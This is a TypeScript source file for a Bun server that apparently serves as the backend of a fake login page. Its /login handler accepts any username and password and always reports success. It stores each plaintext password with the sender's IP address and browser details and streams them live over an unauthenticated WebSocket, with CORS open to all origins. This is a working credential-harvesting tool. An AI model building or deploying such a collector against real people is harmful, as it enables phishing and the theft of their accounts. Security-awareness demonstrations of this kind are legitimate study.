import os from 'os'

function getLocalIP(): string {
  const ifaces = os.networkInterfaces()
  for (const name of Object.keys(ifaces)) {
    for (const iface of ifaces[name] || []) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address
      }
    }
  }
  return '127.0.0.1'
}

const clients = new Set<WebSocket>()

const server = Bun.serve({
  port: 8080,
  async fetch(req, server) {
    const url = new URL(req.url)

    const corsHeaders: Record<string, string> = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    }

    if (req.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders })
    }

    if (url.pathname === '/login' && req.method === 'POST') {
      try {
        const body = await req.json()
        const payload = {
          type: 'login' as const,
          data: {
            username: String(body.username ?? ''),
            password: String(body.password ?? ''),
            timestamp: new Date().toISOString(),
            ip: server.requestIP(req)?.address ?? 'unknown',
            userAgent: req.headers.get('user-agent') ?? 'unknown'
          }
        }
        const message = JSON.stringify(payload)
        for (const ws of clients) {
          ws.send(message)
        }
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        })
      } catch {
        return new Response(JSON.stringify({ success: false, error: 'invalid json' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        })
      }
    }

    if (url.pathname === '/ws') {
      const ok = server.upgrade(req)
      if (ok) return undefined
    }

    if (url.pathname === '/api/server-info') {
      const ip = getLocalIP()
      return new Response(
        JSON.stringify({
          ip,
          loginUrl: `http://${ip}:3000`,
          wsUrl: `ws://${ip}:8080/ws`
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      )
    }

    return new Response('Not Found', { status: 404 })
  },
  websocket: {
    open(ws) {
      clients.add(ws)
    },
    close(ws) {
      clients.delete(ws)
    },
    message() {}
  }
})

console.log(`Backend running at http://localhost:${server.port}`)
console.log(`WebSocket endpoint: ws://localhost:${server.port}/ws`)
